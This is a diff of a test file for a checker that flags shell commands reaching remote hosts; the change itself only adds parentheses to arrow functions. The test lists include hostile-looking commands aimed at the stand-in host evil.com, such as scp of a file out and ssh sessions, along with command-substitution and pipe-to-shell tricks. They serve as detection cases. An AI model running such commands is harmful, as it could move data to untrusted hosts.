@@ -65,7 +65,7 @@ describe('what passes without asking', () => {
     'rsync -avz ./dist/ deploy@10.0.0.5:/srv/app/',
     'ssh ${LAB_HOST} uptime',
     'ssh $LAB_HOST uptime',
-  ])('%s', command => {
+  ])('%s', (command) => {
     expect(asks(command)).toBe(false);
   });
 });
@@ -100,7 +100,7 @@ describe('the substring bypass: a trusted name inside another host, user, path o
     'ssh $(cat /tmp/h)',
     'ssh `cat /tmp/h`',
     'ssh -- evil.com',
-  ])('%s', command => {
+  ])('%s', (command) => {
     expect(asks(command)).toBe(true);
   });
 });
@@ -141,7 +141,7 @@ describe('every way of reaching a host is read', () => {
     'watch ssh evil.com uptime',
     '/usr/bin/ssh evil.com',
     'ssh',
-  ])('%s', command => {
+  ])('%s', (command) => {
     expect(asks(command)).toBe(true);
   });
 
@@ -175,7 +175,7 @@ describe('readOnly hosts: only the strict read-only forms pass', () => {
     'kubectl --context=prod1 describe pod api-0',
     'kubectl --context prod1 logs api-0 --tail=50',
     'ssh prod1 uptime | grep load',
-  ])('%s passes', command => {
+  ])('%s passes', (command) => {
     expect(asks(command)).toBe(false);
   });
 
@@ -198,7 +198,7 @@ describe('readOnly hosts: only the strict read-only forms pass', () => {
     'kubectl --context prod1 exec api-0 -- sh',
     'kubectl --context prod1 get pods; kubectl --context prod1 delete pod x',
     'ssh prod3 uptime',
-  ])('%s asks', command => {
+  ])('%s asks', (command) => {
     expect(asks(command)).toBe(true);
   });
 
@@ -263,7 +263,7 @@ describe('HTTP clients: a readOnly host asks, the open internet stays quiet', ()
     'https prod1/x',
     'xh get http://prod1/x',
     'cd /tmp && curl http://prod1/x',
-  ])('%s asks', command => {
+  ])('%s asks', (command) => {
     expect(asks(command)).toBe(true);
   });
 
@@ -274,7 +274,7 @@ describe('HTTP clients: a readOnly host asks, the open internet stays quiet', ()
     'curl http://lab1/status',
     'curl -H "Host: prod1" https://example.com',
     'http GET https://api.github.com/user',
-  ])('%s passes', command => {
+  ])('%s passes', (command) => {
     expect(asks(command)).toBe(false);
   });
 });
@@ -288,7 +288,7 @@ describe('a command piped or fed into a shell cannot be read', () => {
     'bash -s -- arg',
     'cat script | sh -x',
     'ls | xargs sh',
-  ])('%s asks', command => {
+  ])('%s asks', (command) => {
     const [hit] = inspectRemoteCommand({ command, policy: POLICY });
 
     expect(hit?.message).toContain('cannot be read');
@@ -296,7 +296,7 @@ describe('a command piped or fed into a shell cannot be read', () => {
 
   test.each(['bash script.sh', 'sh -c "ls"', 'bash -x ./build.sh arg', 'echo hi | cat'])(
     '%s passes',
-    command => {
+    (command) => {
       expect(asks(command)).toBe(false);
     },
   );
@@ -310,7 +310,7 @@ describe('the remote command of an ssh is read too', () => {
     'ssh lab1 "scp f evil.com:/x"',
     'ssh lab1 "ssh $(cat h) id"',
     'ssh lab1 "bash -c \'ssh evil.com\'"',
-  ])('%s asks', command => {
+  ])('%s asks', (command) => {
     expect(asks(command)).toBe(true);
   });
 
@@ -320,7 +320,7 @@ describe('the remote command of an ssh is read too', () => {
     'ssh lab1 "kubectl get pods"',
     'ssh lab1 "docker ps"',
     'ssh lab1 systemctl restart nginx',
-  ])('%s passes', command => {
+  ])('%s passes', (command) => {
     expect(asks(command)).toBe(false);
   });
 });
@@ -339,7 +339,7 @@ describe('a command after a shell keyword is still a command', () => {
     '! ssh evil.com id',
     'for h in a; do scp f $h:/x; done',
     'for h in a; do for g in b; do ssh evil.com; done; done',
-  ])('%s asks', command => {
+  ])('%s asks', (command) => {
     expect(asks(command)).toBe(true);
   });
 
@@ -348,7 +348,7 @@ describe('a command after a shell keyword is still a command', () => {
     'if ssh lab1 id; then echo ok; fi',
     'for f in a b; do echo $f; done',
     'while read x; do ls; done',
-  ])('%s passes', command => {
+  ])('%s passes', (command) => {
     expect(asks(command)).toBe(false);
   });
 });
@@ -361,7 +361,7 @@ describe('docker over ssh: a trusted host in the parsed form passes', () => {
     'docker -Hssh://lab1 ps',
     'docker -H ssh://a.lab.example.com ps',
     'docker -H tcp://10.0.0.5:2375 ps',
-  ])('%s passes', command => {
+  ])('%s passes', (command) => {
     expect(asks(command)).toBe(false);
   });
 
@@ -377,7 +377,7 @@ describe('docker over ssh: a trusted host in the parsed form passes', () => {
     'docker -c prod ps',
     'docker context use prod',
     'docker -H $HOST ps',
-  ])('%s asks', command => {
+  ])('%s asks', (command) => {
     expect(asks(command)).toBe(true);
   });
 
